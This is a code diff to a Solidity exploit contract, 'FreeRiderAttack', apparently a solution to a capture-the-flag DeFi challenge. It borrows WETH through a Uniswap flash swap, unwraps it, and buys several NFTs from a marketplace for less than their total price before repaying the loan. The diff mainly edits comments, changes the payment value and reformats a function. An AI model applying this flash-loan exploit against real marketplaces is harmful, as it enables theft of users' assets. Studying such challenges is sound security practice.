@@ -62,7 +62,7 @@ contract FreeRiderAttack is IUniswapV2Callee, IERC721Receiver {
         // amount borrowed
         (address tokenBorrow, uint256 amount) = abi.decode(_data, (address, uint256));
 
-        // unwrap some of the ether that will be taken from the pool
+        // unwrap the ether that will be taken from the pool
         IERC20(weth).approve(weth, type(uint256).max);
         weth.functionCall(abi.encodeWithSignature("withdraw(uint256)", amount));
 
@@ -71,9 +71,9 @@ contract FreeRiderAttack is IUniswapV2Callee, IERC721Receiver {
         uint256[] memory tokenIdsArray = arrayOfIntegers(amountOfOffers);
 
         // buy the NFTs from the exchange
-        marketplace.buyMany{value: 15 ether}(tokenIdsArray);
+        marketplace.buyMany{value: amount}(tokenIdsArray);
 
-        // transfer the NFTs to the attacker
+        // transfer the NFTs to the buyer
         bulkSafeTransferNFT(tokenIdsArray);
 
         // amount to repay
@@ -98,17 +98,8 @@ contract FreeRiderAttack is IUniswapV2Callee, IERC721Receiver {
         }
     }
 
-    function onERC721Received(
-        address,
-        address,
-        uint256 _tokenId,
-        bytes memory
-    ) 
-        external
-        override
-        returns (bytes4)
-    {
-        // transfer tokens to the buyer
+    function onERC721Received(address, address, uint256 _tokenId, bytes memory) external override returns (bytes4) {
+        // receive the NFTs
         return IERC721Receiver.onERC721Received.selector;
     }
 
